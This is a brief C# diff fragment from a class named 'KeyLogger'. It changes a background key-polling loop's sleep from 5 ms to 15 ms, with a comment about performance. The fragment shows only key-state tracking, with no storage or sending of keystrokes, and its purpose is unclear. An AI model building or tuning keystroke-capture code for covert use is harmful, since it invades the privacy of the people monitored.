@@ -48,7 +48,8 @@ public static class KeyLogger
                         else _held.Remove(vk);
                     }
                 }
-                Thread.Sleep(5);
+                // Reduced polling frequency from 5ms to 15ms for better performance
+                Thread.Sleep(15);
             }
         })
         { IsBackground = true }.Start();
